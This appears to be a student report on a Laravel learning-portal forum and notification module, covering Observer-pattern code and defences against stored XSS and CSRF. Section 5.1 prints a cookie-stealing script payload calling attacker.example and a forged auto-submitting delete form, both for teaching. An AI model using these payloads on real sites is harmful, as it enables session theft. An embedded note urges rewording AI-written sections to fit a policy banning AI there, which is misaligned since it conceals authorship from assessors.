# BMIT3173 Integrative Programming

## ASSIGNMENT 202605

**Student Name** : Ong Shun Yan
**Student ID** : _[fill in]_
**Programme** : Bachelor of Information Technology (Honours) in _[fill in]_
**Tutorial Group** : _[fill in]_
**System Title** : LearnSync: Integrated Educational Resource and Collaborative Learning Portal
**Chosen SDG** : SDG 4: Quality Education
**Modules** : Module 3: Student Forum and Notifications Module

---

## AI Usage Disclosure Form

**Declaration (tick one):**

☐ No AI tools were used in the preparation of this report.

☑ AI tools were used as declared in the table below.

| AI Tool Used (name & version) | Purpose / How It Was Used | Report Section(s) Affected |
|---|---|---|
| Anthropic Claude (Opus 5) | Drafting and structuring report text from the finished code | 1, 2, 3, 4, 5, 6 |
| Anthropic Claude (Opus 5) | Writing the notification web service and extending the Observer to its later subjects | 4, 6 |
| Anthropic Claude (Opus 5) | Explaining design pattern ideas and secure coding methods | 4.1, 5.2 |

*If no AI tools were used, tick "No AI tools used". Non-disclosure breaches the AI Policy.*

I declare this Form is true and complete and that my AI use complied with the AI Policy and the Yellow conditions above.

**Sign:** ______________________  **Date:** ______________

> **[IMPORTANT] Please read before you submit.** This assignment is YELLOW (Limited AI). The policy does not allow AI to write the design pattern justification, the threat analysis or the secure coding rationale. Those are sections 4.3, 5.1 and 5.2. You should rewrite those three sections in your own words. Everything in them is true about your code, so you only need to say the same things your own way.

---

## Table of Contents

| Section | Page |
|---|---|
| **1. Introduction to the System** | 4 |
| &nbsp;&nbsp;&nbsp;&nbsp;1.1 System Overview | 4 |
| &nbsp;&nbsp;&nbsp;&nbsp;1.2 Chosen Sustainable Development Goal (SDG) | 5 |
| &nbsp;&nbsp;&nbsp;&nbsp;1.3 System Contribution to SDG 4 & Scope | 6 |
| **2. Module Description** | 7 |
| &nbsp;&nbsp;&nbsp;&nbsp;2.1 Scope of Module 3: Student Forum and Notifications | 7 |
| &nbsp;&nbsp;&nbsp;&nbsp;2.2 Functional Breakdown & Class Paths | 8 |
| **3. Entity Classes** | 13 |
| &nbsp;&nbsp;&nbsp;&nbsp;3.1 Entity Class Diagram | 13 |
| &nbsp;&nbsp;&nbsp;&nbsp;3.2 Entity Class Implementation (Eloquent ORM Mapping) | 14 |
| **4. Design Pattern** | 16 |
| &nbsp;&nbsp;&nbsp;&nbsp;4.1 Description of Design Pattern: Observer Pattern (GoF Behavioural) | 16 |
| &nbsp;&nbsp;&nbsp;&nbsp;4.2 Implementation of Design Pattern | 18 |
| &nbsp;&nbsp;&nbsp;&nbsp;4.3 Justification of Design Pattern | 23 |
| **5. Software Security** | 24 |
| &nbsp;&nbsp;&nbsp;&nbsp;5.1 Potential Threats and Attacks | 24 |
| &nbsp;&nbsp;&nbsp;&nbsp;5.2 Secure Coding Practices & Implementation | 25 |
| **6. Web Services** | 27 |
| &nbsp;&nbsp;&nbsp;&nbsp;6.1 Web Service Exposure | 27 |
| &nbsp;&nbsp;&nbsp;&nbsp;6.2 Web Service Consumption | 30 |
| **7. References** | 33 |
| **8. Appendices** | 34 |
| &nbsp;&nbsp;&nbsp;&nbsp;Appendix A: Automated Testing Results | 34 |
| &nbsp;&nbsp;&nbsp;&nbsp;Appendix B: GitHub Repository URL | 36 |

> **[IMPORTANT]** These page numbers are only estimates. In Word, delete this table and use References then Table of Contents then Automatic Table.

---

# 1. Introduction to the System

## 1.1 System Overview

LearnSync is a web based Learning Management System (LMS). Lecturers use it to upload notes, set quizzes, give assignments and mark student work. Students use it to study the notes, sit the quizzes, hand in assignments, watch their progress, and ask questions in a course forum.

The problem LearnSync solves is about proof. In most systems, the certificate a student earns is just a PDF file. Anyone can open that PDF in a word processor and change the marks. If an employer wants to check whether a certificate is real, they must email the college and wait days for a reply. Most employers do not bother.

LearnSync fixes this. Every certificate it creates carries a unique ID, a QR code anyone can scan, and a hidden security code proving the record has not been changed. Anyone can check a certificate in seconds, for free, without an account.

## 1.2 Chosen Sustainable Development Goal (SDG)

LearnSync is built around United Nations Sustainable Development Goal 4: Quality Education (SDG 4).

**What SDG 4 aims to do:**

SDG 4 wants to make sure education is fair, good quality and available to everyone by 2030 (United Nations, 2015). Target 4.3 is about giving everyone fair access to affordable college and university education. Target 4.4 is about increasing the number of people who have real skills for getting a job.

## 1.3 System Contribution to SDG 4 & Scope

LearnSync supports SDG 4 in three ways:

1. **Who benefits:** Students who earn certificates, lecturers who teach and mark the courses, administrators who control access, and outside people such as employers who need to check a qualification.

2. **Making sure nobody studies alone:** A student who gets stuck at home in the evening cannot walk to a lecturer's office. Module 3 gives every course a question and answer forum, and makes sure that asking a question actually reaches somebody. A question nobody sees is the same as no question at all, so the moment a post is saved the lecturer is told about it. This is what SDG 4 means by inclusive: a student's ability to get help should not depend on being physically present at the right moment.

3. **Making qualifications checkable:** Every certificate carries a unique ID, a QR code and a security code, so an employer can confirm it instantly and for free.

**What the system does not do:** LearnSync does not replace official government accreditation, and the forum is deliberately not a live chat. The specification rules out WebSockets, so messages are saved to the database and appear on the next page load rather than instantly.

---

# 2. Module Description

## 2.1 Scope of Module 3: Student Forum and Notifications

I am the developer in charge of Module 3, the Student Forum and Notifications Module. This module has two halves that work together. I designed and built:

- a question and answer forum attached to every course, created automatically so no course is ever without somewhere to ask
- tagging people with an @ so a question can be aimed at a particular person
- the event system that turns activity anywhere in LearnSync into a message in somebody's inbox
- the single shared sender that every notification passes through, which applies each user's on and off switches and refuses to tell anybody the same thing twice
- the scheduled reminder command that warns people about classes starting and deadlines approaching

The specification splits the notification work in two. **Module 3 produces the events. Module 1 owns the inbox that displays them.** Neither has to import the other, which is exactly what the Observer pattern makes possible.

## 2.2 Functional Breakdown & Class Paths

### F3.1: The Course Discussion Forum

- **Description:** Every course gets exactly one question and answer forum, created at the same moment as the course itself, so a course can never exist without somewhere to ask. The page is laid out as a conversation, with questions in order and replies indented under them. A lecturer's own messages are marked so an answer can be told apart from a classmate's guess.

  Administrators are deliberately locked out of posting. The specification states that they run the class and are not in it, so access is checked against the `forum.post` permission rather than simply being logged in. An administrator who opens a forum URL receives 403 with the message that administrators do not take part in forums.

  Deleting is allowed in two cases only: an author may remove their own message, and a lecturer may moderate messages in the forum belonging to their own course.
- **Class Paths:**
  - Controller: `app/Http/Controllers/ForumController.php` (`show`, `storePost`, `destroyPost`, `storeReply`, `destroyReply`)
  - Models: `app/Models/DiscussionForum.php`, `app/Models/Post.php`, `app/Models/Reply.php`
  - View Template: `resources/views/forums/show.blade.php`

*Figure 2.1: A Course Forum Showing a Question with Indented Replies*

*Figure 2.2: An Administrator Receiving 403 When Opening a Forum*

### F3.2: Tagging People with an @

- **Description:** Typing `@name` in a post or a reply notifies that person. Three ways of writing the same person are accepted, because real names have spaces in them and a handle cannot: the full name with spaces closed up such as `@FooChongXian`, just the first name such as `@Foo` when it is unambiguous, or the local part of their email address.

  The list of people who can be tagged comes from the course itself, meaning its enrolled students and its lecturer. A mention can therefore never reach somebody outside the conversation, and a student cannot use a tag to send a message to a stranger.

  If two people in the same course would both answer to a handle, such as two students named Ong, then `@Ong` notifies neither of them. Notifying nobody is quieter and safer than guessing and notifying the wrong person.
- **Class Paths:**
  - Support Class: `app/Support/Mentions.php` (`parse`, `candidates`, `highlight`, `handlesFor`)
  - Called from: `app/Patterns/Observer/SystemNotificationObserver.php` (`notifyMentions`)

*Figure 2.3: A Post Containing an @mention, with the Handle Highlighted*

### F3.3: Turning Activity into Notifications

- **Description:** This is the heart of the module and the reason it uses the Observer pattern. When something happens anywhere in LearnSync, the people affected are told, without the code that caused it knowing anything about notifications.

  Seven kinds of event now produce a notification:

  | What happened | Who is told |
  |---|---|
  | A student posts a question in a forum | The course lecturer |
  | Someone replies to a post | Whoever wrote the original post |
  | Someone is tagged with an @ | The person named, and only once |
  | Someone comments under an announcement | The person who wrote the announcement |
  | A lecturer posts an announcement | Every student on that course |
  | Submitted coursework is marked | The student who submitted it |
  | A certificate is issued | The student who earned it |
  | A student is invited to a course | The invited student |

  Being told once is enough. If a student tags the lecturer inside a new question, the lecturer gets the mention notification and the separate new question notification is skipped, rather than the same person receiving two messages about one post.
- **Class Paths:**
  - Observer: `app/Patterns/Observer/SystemNotificationObserver.php`
  - Registration: `app/Providers/AppServiceProvider.php` (`registerModelObservers`)
  - Shared Sender: `app/Support/Notifier.php` (`send`, `alreadySent`)

*Figure 2.4: The Notification Bell Showing an Unread Count After a Student Posts*

### F3.4: The Shared Sender and Per User Settings

- **Description:** Every notification in the system, no matter which part of LearnSync produced it, is written by one method: `Notifier::send()`. It does two jobs before writing anything.

  First it checks the recipient's settings. Each user can switch individual notification types on or off. Settings are opt out, so a user with no saved setting still receives notifications. Turning a type off stops the row being created at all, rather than creating it and hiding it.

  Second, when the caller supplies a reference such as `event:12`, it checks whether this person has already been told this exact thing, and refuses to repeat it. This is what makes the reminder command safe to run every fifteen minutes.
- **Class Paths:**
  - Support Class: `app/Support/Notifier.php`
  - Model: `app/Models/NotificationPreference.php`
  - Controller: `app/Http/Controllers/NotificationController.php` (`editPreferences`, `updatePreferences`)

*Figure 2.5: The Notification Settings Screen with Individual On and Off Switches*

### F3.5: Scheduled Reminders

- **Description:** A calendar nobody looks at reminds nobody, so a scheduled command produces three kinds of reminder: a class or meeting starting within the hour, an assignment due within the day, and an assignment that has just closed with work waiting to be marked.

  Only students who have **not** submitted are reminded about a deadline. Reminding somebody to do a thing they have already done is how people learn to ignore notifications altogether.

  **These reminders are not the Observer, and the report should not claim they are.** The Observer fires when a model is saved. Nothing is saved when a deadline approaches, because the passing of time is not an event in the database and there is no subject to observe. This is a scheduled producer that feeds the same inbox through the same sender.
- **Class Paths:**
  - Command: `app/Console/Commands/SendScheduledReminders.php` (`handle`, `remindAboutEvents`, `remindStudentsOfDeadlines`, `tellInstructorsWorkIsReadyToMark`)
  - Schedule: `routes/console.php`

*Figure 2.6: Terminal Output of php artisan reminders:send*

---

# 3. Entity Classes

## 3.1 Entity Class Diagram

The diagram below shows the entity classes using object references, meaning one object points to another object, instead of database foreign keys.

> **[IMPORTANT] You need to draw this diagram yourself.** An entity class diagram is not an ERD. Show each class as a box with its attributes, its methods, and lines connecting it to other classes with multiplicities such as 1 or 0..*. Draw it in draw.io, Visual Paradigm or StarUML, save it as a PNG, upload it to Google Drive, and paste both the link and the picture here.

**Diagram link:** _[paste your Google Drive link here]_

*Figure 3.1: Entity Class Diagram for Module 3 Student Forum and Notifications*

Here are the classes Module 3 owns, together with the two classes it writes into that Module 1 owns:

```
DiscussionForum                         Post
- id: Integer                           - id: Integer
- title: String                         - content: Text
-- course: Course [1]                   -- forum: DiscussionForum [1]
-- posts: Post [0..*]                   -- author: User [1]
                                        -- replies: Reply [0..*]
Reply
- id: Integer                           Notification  (Module 1 owns the inbox,
- content: Text                         - id: Integer   Module 3 writes the rows)
-- post: Post [1]                       - type: String
-- author: User [1]                     - message: String
                                        - link: String
NotificationPreference                  - reference: String
- id: Integer                           - isRead: Boolean
- type: String                          -- user: User [1]
- enabled: Boolean
-- user: User [1]
```

A forum has exactly one course and a course has at most one forum, which is a one to one relationship. A post belongs to one forum and may have many replies. `Notification` carries a `reference` such as `event:12` describing what it is about, which is what lets the sender refuse to say the same thing twice.

## 3.2 Entity Class Implementation (Eloquent ORM Mapping)

The classes are written in PHP using Laravel's Eloquent ORM. Relationships are written as methods, so the code never writes SQL. Calling `$post->author` returns a whole `User` object, so `$post->author->name` reads the writer's name by following the link between objects.

```php
namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;

/**
 * Module 3 -- the SUBJECT of the Observer pattern.
 *
 * This class knows nothing at all about notifications. Saving one raises an
 * Eloquent created event, and the registered observer does the rest.
 */
class Post extends Model
{
    protected $fillable = ['forum_id', 'user_id', 'content'];

    /** Object reference: a post belongs to one forum */
    public function forum(): BelongsTo
    {
        return $this->belongsTo(DiscussionForum::class, 'forum_id');
    }

    /** Object reference: a post was written by one user */
    public function author(): BelongsTo
    {
        return $this->belongsTo(User::class, 'user_id');
    }

    /** Object reference: a post collects many replies */
    public function replies(): HasMany
    {
        return $this->hasMany(Reply::class);
    }
}
```

```php
namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;

class DiscussionForum extends Model
{
    protected $fillable = ['course_id', 'title'];

    /** Object reference: one forum belongs to exactly one course */
    public function course(): BelongsTo
    {
        return $this->belongsTo(Course::class);
    }

    /** Object reference: a forum holds many posts */
    public function posts(): HasMany
    {
        return $this->hasMany(Post::class, 'forum_id');
    }
}
```

---

# 4. Design Pattern

## 4.1 Description of Design Pattern: Observer Pattern (GoF Behavioural)

For Module 3, I used the Observer Design Pattern, which is a Gang of Four Behavioural Pattern.

**What the pattern means:**

Gamma, Helm, Johnson and Vlissides (1994) describe the Observer Pattern as one that defines a one to many dependency between objects, so that when one object changes state, all the objects depending on it are told and updated automatically.

In simple words, one object called the Subject has something happen to it. Other objects called Observers care about that. Without the pattern, the Subject has to hold a list of everyone who cares and call each of them by name, which means the Subject must know about every one of them. Add a new interested party and the Subject has to be edited again.

The Observer pattern turns this around. The Subject simply announces that something happened. Observers register themselves separately. The Subject never learns who is listening, and adding a new listener means touching only the new listener.

**How this works in my module:**

- **Subject:** the `Post` model, and six other models. Saving one is the announcement.
- **The notify() mechanism:** Eloquent's model events. Saving a model broadcasts a `created` event automatically.
- **Observer:** `SystemNotificationObserver`, which receives that event and turns it into inbox messages.
- **Registration:** `AppServiceProvider` attaches the observer to each subject with `Post::observe(...)`, so no model contains a line about notifications.

**The seven subjects sharing this one observer:**

| Subject | What the observer does when it is created |
|---|---|
| `Post` | Tells the course lecturer, and anyone tagged with an @ |
| `Reply` | Tells whoever wrote the original post, and anyone tagged |
| `AnnouncementComment` | Tells whoever wrote the announcement |
| `Announcement` | Tells every student on the course |
| `Grade` | Tells the student their coursework has been marked |
| `Certificate` | Tells the student they have earned a credential |
| `CourseInvitation` | Tells the student they have been invited |

**What is deliberately not the Observer.** The scheduled reminders in `SendScheduledReminders` are not observers and the report must not claim they are. An observer fires when a model is saved. Nothing is saved when a deadline approaches, because time passing is not a database event and there is no subject to watch. Reminders are a scheduled producer that happens to feed the same inbox through the same sender.

**Diagram link:** _[paste your Google Drive link here]_

*Figure 4.1: Observer Pattern Class Diagram Showing the Seven Subjects*

```
   THE SUBJECTS - none of them knows notifications exist
   +--------+ +-------+ +-------------------+ +--------------+
   |  Post  | | Reply | |AnnouncementComment| | Announcement |
   +--------+ +-------+ +-------------------+ +--------------+
   +--------+ +-------------+ +------------------+
   | Grade  | | Certificate | | CourseInvitation |
   +--------+ +-------------+ +------------------+
        |          |                |
        |  Eloquent raises a `created` event when any is saved.
        |  This IS the notify() call of the pattern.
        v          v                v
   +---------------------------------------------------+
   |        «Observer»                                  |
   |        SystemNotificationObserver                  |
   +---------------------------------------------------+
   | + created(Model): void                             |
   | - onPostCreated(Post): void                        |
   | - onReplyCreated(Reply): void                      |
   | - onAnnouncementCreated(Announcement): void        |
   | - onGradeRecorded(Grade): void                     |
   | - onCertificateIssued(Certificate): void           |
   | - onCourseInvitationCreated(CourseInvitation): void|
   | - notifyMentions(...): Collection                  |
   +------------------------+--------------------------+
                            |
                            v
              +--------------------------+
              |    Notifier  (shared)    |
              +--------------------------+
              | + send(...): bool        |
              | + alreadySent(...): bool |
              +------------+-------------+
                           |  checks preferences,
                           |  refuses duplicates
                           v
                +----------------------+
                |     Notification     |
                | (Module 1's inbox)   |
                +----------------------+

   Registered in AppServiceProvider:  Post::observe(SystemNotificationObserver::class);
```

## 4.2 Implementation of Design Pattern

### 1. Attaching the Observer to Its Subjects (`app/Providers/AppServiceProvider.php`)

```php
private function registerModelObservers(): void
{
    // Conversation.
    Post::observe(SystemNotificationObserver::class);
    Reply::observe(SystemNotificationObserver::class);
    AnnouncementComment::observe(SystemNotificationObserver::class);

    /*
     * Everything else worth being told about.
     *
     * Adding these four took four lines here and NO change whatsoever to
     * the announcement screen, the grading flow, the credential authority
     * or the enrolment controller, which is the claim the Observer pattern
     * makes, demonstrated rather than asserted.
     */
    Announcement::observe(SystemNotificationObserver::class);
    Grade::observe(SystemNotificationObserver::class);
    Certificate::observe(SystemNotificationObserver::class);
    CourseInvitation::observe(SystemNotificationObserver::class);
}
```

### 2. The Observer (`app/Patterns/Observer/SystemNotificationObserver.php`)

```php
namespace App\Patterns\Observer;

use App\Models\Announcement;
use App\Models\AnnouncementComment;
use App\Models\Certificate;
use App\Models\Course;
use App\Models\CourseInvitation;
use App\Models\Grade;
use App\Models\Post;
use App\Models\Reply;
use App\Models\User;
use App\Support\Mentions;
use App\Support\Notifier;
use Illuminate\Database\Eloquent\Model;

class SystemNotificationObserver
{
    // Types the user can switch off individually in their settings
    public const TYPE_NEW_POST = 'forum.post';
    public const TYPE_NEW_REPLY = 'forum.reply';
    public const TYPE_MENTION = 'forum.mention';
    public const TYPE_ANNOUNCEMENT_COMMENT = 'announcement.comment';
    public const TYPE_ANNOUNCEMENT_POSTED = 'announcement.posted';
    public const TYPE_GRADE_RECORDED = 'grade.recorded';
    public const TYPE_CERTIFICATE_ISSUED = 'certificate.issued';
    public const TYPE_COURSE_INVITATION = 'course.invitation';

    /**
     * Fired by Eloquent whenever any observed model is created.
     *
     * SEVEN SUBJECTS, ONE OBSERVER, and none of them knows it exists.
     */
    public function created(Model $model): void
    {
        match (true) {
            $model instanceof Post => $this->onPostCreated($model),
            $model instanceof Reply => $this->onReplyCreated($model),
            $model instanceof AnnouncementComment => $this->onAnnouncementCommentCreated($model),
            $model instanceof Announcement => $this->onAnnouncementCreated($model),
            $model instanceof Grade => $this->onGradeRecorded($model),
            $model instanceof Certificate => $this->onCertificateIssued($model),
            $model instanceof CourseInvitation => $this->onCourseInvitationCreated($model),
            default => null,
        };
    }

    /**
     * A student asked something, so tell the course lecturer.
     */
    private function onPostCreated(Post $post): void
    {
        $post->loadMissing(['forum.course', 'author']);
        $course = $post->forum?->course;

        if ($course === null) {
            return;
        }

        $link = route('forums.show', $post->forum_id).'#post-'.$post->id;

        // Anyone tagged with an @ hears about it first, and hearing once is
        // enough, so the lecturer notice below is skipped for somebody who
        // has already been told they were mentioned.
        $mentioned = $this->notifyMentions($post->content, $course, $post->author, $link);

        if ($course->instructor_id === $post->user_id || $mentioned->contains($course->instructor_id)) {
            return;
        }

        $this->notify(
            userId: $course->instructor_id,
            type: self::TYPE_NEW_POST,
            message: "{$post->author->name} posted in {$course->title}",
            link: $link,
        );
    }

    /**
     * Work was marked, so tell the student.
     *
     * Coursework only. A quiz is marked the instant it is submitted and the
     * student is already looking at the result, so telling them is noise.
     * A submission is different: a person marks it later, out of sight.
     */
    private function onGradeRecorded(Grade $grade): void
    {
        if ($grade->submission_id === null) {
            return;
        }

        $grade->loadMissing('submission.assignment.course');
        $submission = $grade->submission;
        $assignment = $submission?->assignment;

        if ($submission === null || $assignment === null) {
            return;
        }

        $this->notify(
            userId: $submission->student_id,
            type: self::TYPE_GRADE_RECORDED,
            message: "Your work on \"{$assignment->title}\" has been marked: ".$grade->display(),
            link: route('assignments.show', $assignment->id),
            reference: 'grade:'.$grade->id,
        );
    }

    /**
     * Tell everyone tagged with an @ in a message.
     *
     * Candidates come from the course, so a mention can never reach somebody
     * outside the conversation, and tagging yourself notifies nobody.
     */
    private function notifyMentions(string $body, Course $course, ?User $author, string $link)
    {
        return Mentions::parse($body, $course)
            ->reject(fn (User $user) => $author && $user->id === $author->id)
            ->each(fn (User $user) => $this->notify(
                userId: $user->id,
                type: self::TYPE_MENTION,
                message: ($author?->name ?? 'Someone')." mentioned you in {$course->title}",
                link: $link,
            ))
            ->pluck('id');
    }

    /**
     * Hand the row to the shared sender, which applies the recipient's
     * settings and refuses duplicates.
     */
    private function notify(int $userId, string $type, string $message,
                            string $link, ?string $reference = null): void
    {
        Notifier::send($userId, $type, $message, $link, $reference);
    }
}
```

### 3. The Shared Sender (`app/Support/Notifier.php`)

```php
namespace App\Support;

use App\Models\Notification;
use App\Models\NotificationPreference;

/**
 * MODULE 3 -- the one place an inbox row gets written.
 *
 * Two very different producers feed it. The Observer writes when something
 * happens. The reminder command writes when a time approaches. Both must
 * honour the recipient's settings, and a rule like that rots the moment it
 * is implemented twice, so it lives here.
 */
class Notifier
{
    public static function send(int $userId, string $type, string $message,
                                string $link, ?string $reference = null): bool
    {
        $preference = NotificationPreference::where('user_id', $userId)
            ->where('type', $type)
            ->first();

        // Settings are opt out: a missing row means the user has never
        // changed the setting, and silence should not mean send nothing.
        if ($preference !== null && ! $preference->enabled) {
            return false;
        }

        // Given a reference, the same person is never told the same thing
        // twice, which is what makes a reminder safe to run on a schedule.
        if ($reference !== null && self::alreadySent($userId, $type, $reference)) {
            return false;
        }

        Notification::create([
            'user_id' => $userId,
            'type' => $type,
            'message' => $message,
            'link' => $link,
            'reference' => $reference,
            'is_read' => false,
        ]);

        return true;
    }

    public static function alreadySent(int $userId, string $type, string $reference): bool
    {
        return Notification::where('user_id', $userId)
            ->where('type', $type)
            ->where('reference', $reference)
            ->exists();
    }
}
```

### 4. The Subject, Which Contains Nothing About Notifications (`app/Http/Controllers/ForumController.php`)

```php
/*
 * The Observer is attached to the Post model rather than to this controller,
 * so writing one here still raises the notification without this method
 * knowing that notifications exist.
 */
public function storePost(Request $request, DiscussionForum $forum): RedirectResponse
{
    $this->authoriseParticipant($request, $forum);

    $data = $request->validate([
        'content' => ['required', 'string', 'min:3', 'max:5000'],
    ]);

    Post::create([
        'forum_id' => $forum->id,
        'user_id'  => $request->user()->id,
        'content'  => $data['content'],
    ]);

    return redirect()->route('forums.show', $forum)->with('success', 'Posted.');
}
```

**There is not one word about notifications in this method.** It saves a post. The lecturer is told anyway.

## 4.3 Justification of Design Pattern

**1. The producer and the consumer belong to different people.** The specification splits this work deliberately: Module 3 produces notification events, and Module 1 owns the inbox that shows them. Without the Observer, `ForumController` would have to load the course, find the lecturer, read their notification settings, and write a row into Module 1's table. Module 3's controller would then contain Module 1's rules, and any change to how the inbox works would mean editing Module 3. The Observer keeps that boundary intact, because neither module imports the other.

**2. The claim was tested by real growth, and it held.** The observer began with three subjects: `Post`, `Reply` and `AnnouncementComment`. Four more were added later, when an audit of the system found that earning a certificate, having work marked, receiving a course invitation and being sent an announcement all happened in complete silence. Adding all four took **four lines in `AppServiceProvider` and four private methods in the observer**. Not one line changed in the announcement screen, the grading flow, the credential authority or the enrolment controller. That is the **Open Closed Principle** demonstrated by what actually happened rather than asserted in theory.

**3. One observer serving seven subjects keeps the rules in one place.** Every subject shares the same downstream behaviour: work out who cares, then hand the message to `Notifier::send()`. If each subject had its own observer, the rule about not telling somebody twice, and the rule about honouring their settings, would be repeated seven times and would drift apart the first time one was edited.

**4. It respects the Single Responsibility Principle.** `ForumController::storePost()` has exactly one job, which is saving a post. Notifying people is a separate concern with its own reasons to change, such as adding an email digest later, and it lives in a separate class. A second observer could be attached to `Post` tomorrow without touching the forum at all.

**5. The honest limit is worth stating.** The Observer only works when something is saved. The reminders in `SendScheduledReminders` cannot use it, because a deadline approaching saves nothing and there is no subject to observe. Recognising where a pattern does not apply is part of using it correctly, and the report says so plainly rather than stretching the pattern to cover work it does not do.

---

# 5. Software Security

## 5.1 Potential Threats and Attacks

### Threat 1: Stored Cross Site Scripting Through Forum Content (OWASP A03: Injection)

**Attack Description:**

The forum is the only place in LearnSync where one user's typed text is shown to other users. That makes it the natural home for a Stored Cross Site Scripting attack, which is the most dangerous form of XSS because the payload is saved once and then fires for every person who later reads the page.

A student posts a question whose content is not really a question:

```
<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
```

If that text is written into the page as it was typed, the browser does not display it. It executes it. Every classmate who opens the forum, and the lecturer who opens it to answer, silently sends their session cookie to the attacker's server. The attacker then loads that cookie into their own browser and is logged in as the victim, with no password needed.

The damage depends on who reads the post first. A classmate's session gives access to their submitted work and grades. **The lecturer's session is far worse**, because a lecturer can change marks, and marks automatically trigger the certificate machinery in Module 1. A stored XSS payload in a forum can therefore end in a fraudulent certificate.

A quieter version does not steal anything at all. It rewrites the page, for example replacing the assignment deadline shown to every student, or adding a fake login box that posts the password to the attacker.

The reason this threat belongs to my module specifically is that the forum deliberately renders content with the raw output tag `{!! !!}` rather than the escaped `{{ }}`, because mentions need to become highlighted spans. Raw output is exactly how stored XSS happens, so the safety has to be built carefully rather than assumed.

**Risk Impact:**

Session hijacking of any reader including lecturers, theft of session cookies, unauthorised changes to grades through a stolen lecturer session, and defacement of course pages seen by an entire class.

### Threat 2: Cross Site Request Forgery on Forum Actions (OWASP A01: Broken Access Control)

**Attack Description:**

Posting, replying and deleting in the forum are all state changing actions performed by a logged in user through a form. Cross Site Request Forgery abuses the fact that a browser attaches its cookies to a request automatically, no matter which website caused that request to be sent.

An attacker builds a page on their own site containing a hidden form aimed at LearnSync, and a line of script that submits it as soon as the page loads:

```html
<form id="x" method="POST" action="http://localhost:8000/posts/47">
    <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.getElementById('x').submit();</script>
```

They then get a lecturer to open that page, perhaps by sending the link in an email that looks like a student query. The lecturer's browser sends the delete request to LearnSync **with the lecturer's session cookie attached**, because that is simply what browsers do. As far as LearnSync can tell from the cookie alone, the lecturer chose to delete that post.

The attacker never sees the response and never steals the cookie. They do not need to. They only need the action to happen. Aimed at a forum, this silently deletes student questions and lecturer answers. The victim has no idea anything occurred, because the malicious page can look completely blank.

**Risk Impact:**

Silent destruction of forum content, unwanted posts published under a victim's name, and in general any state changing action in the application being performed without the account holder's knowledge or consent.

## 5.2 Secure Coding Practices & Implementation

> Input validation is used on every forum write, with `required`, `min` and `max` rules on the content field. As the assignment requires, it is not counted as one of the two practices below. Validation would not have stopped either attack anyway: a script tag is a perfectly valid string, and a forged request carries perfectly valid data.

### Secure Practice 1: Escaping Before Adding Markup, Never After

**OWASP Category: Output Encoding.** The forum has to render raw HTML, because an `@mention` becomes a highlighted span. Raw output is normally where stored XSS lives, so the safety comes from the **order of operations**: the user's text is escaped first, and only the application's own markup is added afterwards.

```php
// app/Support/Mentions.php

/**
 * Turn the @handles in a message into highlighted spans.
 *
 * SECURITY (Module 3): the body is escaped FIRST and only then marked up,
 * so a message containing HTML is still shown as text.
 */
public static function highlight(string $body, Course $course): string
{
    $candidates = self::candidates($course);

    // STEP 1: escape everything the user typed. From this line onwards the
    // string contains no live HTML at all. <script> has already become
    // &lt;script&gt; and can never execute.
    $escaped = e($body);

    // STEP 2: add OUR OWN markup to the already safe string. The span tags
    // below are written by us, not by the user, so they are trustworthy.
    return preg_replace_callback(
        '/@([A-Za-z0-9._-]{2,60})/',
        function (array $m) use ($candidates) {
            // An unknown handle is left as plain text rather than linked
            if (! $candidates->has(strtolower($m[1]))) {
                return $m[0];
            }

            return '<span class="rounded bg-blue-50 px-1 font-medium text-blue-700">'.$m[0].'</span>';
        },
        $escaped
    );
}
```

```blade
{{-- resources/views/forums/show.blade.php --}}

{{-- Escaped inside highlight(), then the @names are wrapped. Raw output is
     safe here ONLY because the escaping already happened. --}}
{!! \App\Support\Mentions::highlight($post->content, $course) !!}
```

*Why the order is the whole defence. If the two steps were swapped, so that markup was added and the result escaped afterwards, the highlight spans would themselves be escaped and students would see `&lt;span class=...&gt;` printed on screen. If the escaping were skipped entirely, a script tag typed by a student would run in every reader's browser. Escaping first and marking up second is the only order that is both correct and safe.*

*Why `e()` is enough. Laravel's `e()` helper calls `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')`, which converts `<`, `>`, `"`, `'` and `&` into their HTML entities. A payload of `<script>alert(1)</script>` becomes `&lt;script&gt;alert(1)&lt;/script&gt;`, which the browser prints as visible text rather than treating as a tag.*

**Everywhere else in the application uses the escaped `{{ }}` tag by default.** There are only four uses of raw output in the entire codebase, and each is safe for a stated reason:

| File | Why raw output is safe there |
|---|---|
| `forums/show.blade.php` (posts) | Escaped by `Mentions::highlight()` first |
| `forums/show.blade.php` (replies) | Escaped by `Mentions::highlight()` first |
| `certificates/pdf.blade.php` | Wrapped as `nl2br(e($bodyText))`, so escaped before line breaks are added |
| `analytics/index.blade.php` | An SVG the application generated itself from an XSLT stylesheet, never user text |

*Figure 5.1: A Post Containing a Script Tag, Displayed Harmlessly as Visible Text*

*Figure 5.2: Page Source Showing the Payload Stored as Escaped HTML Entities*

### Secure Practice 2: Synchroniser Tokens on Every State Changing Request

**OWASP Category: Session Management.** Every form that changes something carries a secret token tied to the current session. A forged request from another website cannot know that token, so it is refused.

```blade
{{-- resources/views/forums/show.blade.php --}}

<form method="post" action="{{ route('forums.posts.store', $forum) }}">
    {{-- SECURITY (Module 3): the synchroniser token. Laravel writes a
         hidden _token field holding a random value tied to this session. --}}
    @csrf

    <textarea name="content" rows="2" required minlength="3"></textarea>
    <button type="submit">Post question</button>
</form>

<form method="post" action="{{ route('posts.destroy', $post) }}"
      onsubmit="return confirm('Delete this post?');">
    @csrf
    @method('DELETE')
    <button type="submit">Delete</button>
</form>
```

*How this stops the attack. Laravel's `VerifyCsrfToken` middleware runs on every POST, PUT, PATCH and DELETE, and compares the submitted `_token` against the value stored in the session. The attacker's page on their own domain cannot read LearnSync's session, so it cannot include a valid token, and the browser's same origin policy prevents their script from fetching one. The forged delete arrives with no token or a wrong one and is rejected with HTTP 419 before the controller is ever reached.*

The project also handles the honest version of the same failure, where a real user has two tabs open and signs in as somebody else in one of them:

```php
// bootstrap/app.php

/*
 * A stale tab.
 *
 * A browser holds one login at a time, so signing in as somebody else in a
 * second tab replaces the session everywhere. The first tab still shows a
 * form carrying the previous session's CSRF token, and submitting it raises
 * a token mismatch.
 *
